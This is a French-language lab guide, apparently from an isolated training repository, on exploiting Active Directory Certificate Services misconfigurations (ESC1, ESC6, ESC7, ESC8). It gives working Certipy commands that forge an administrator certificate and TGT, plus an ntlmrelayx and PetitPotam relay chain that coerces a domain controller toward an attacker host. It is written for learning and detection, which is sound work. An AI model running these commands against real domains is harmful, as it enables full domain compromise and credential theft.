# Attack — Exploiter les ESC (lab isolé)

> ⚠️ Lab isolé uniquement (voir LEGAL.md). Exploitation à des fins d'apprentissage et de détection.

## Techniques
- **MITRE ATT&CK** : T1649 (Steal or Forge Authentication Certificates), T1556, T1078.
- **Outils** : Certipy (Linux), Certify/Rubeus (Windows), PetitPotam/Coercer (ESC8).

## ESC1 — template à SAN libre
```bash
certipy find -u jon.snow@corp.meridian.com -p '***' -dc-ip 10.10.0.10 -vulnerable -stdout
certipy req  -u jon.snow@corp.meridian.com -p '***' -ca 'Meridian Issuing CA' \
  -template 'VulnTemplate' -upn 'administrator@corp.meridian.com'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10         # -> TGT admin
```

## ESC8 — relais NTLM vers Web Enrollment
```bash
# 1) relais vers l'endpoint HTTP de la CA
ntlmrelayx.py -t http://PAR-CA-01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# 2) coercer un DC pour qu'il s'authentifie vers nous
python3 PetitPotam.py <attacker_ip> 10.10.0.10
# -> certificat du DC -> certipy auth -> compromission
```

## ESC7 — droits ManageCA/ManageCertificates
Abuser des droits de gestion de la CA (ex. publier un template, approuver une demande) pour émettre
un certificat d'auth.

## ESC6 — flag SAN sur la CA
Si `EDITF_ATTRIBUTESUBJECTALTNAME2` actif, même un template "sûr" accepte un SAN arbitraire → ESC1-like.

## Ancrage réel
La chaîne **PetitPotam + ESC8** (relais vers AD CS → certificat du DC → DCSync) est l'une des plus
médiatisées (2021+). ESC1 reste omniprésent en audit. Groupes et rançongiciels les exploitent.

## Résultat attendu
Pour chaque ESC exploité : savoir le **détecter** et le **réparer** (voir `defend.md`).
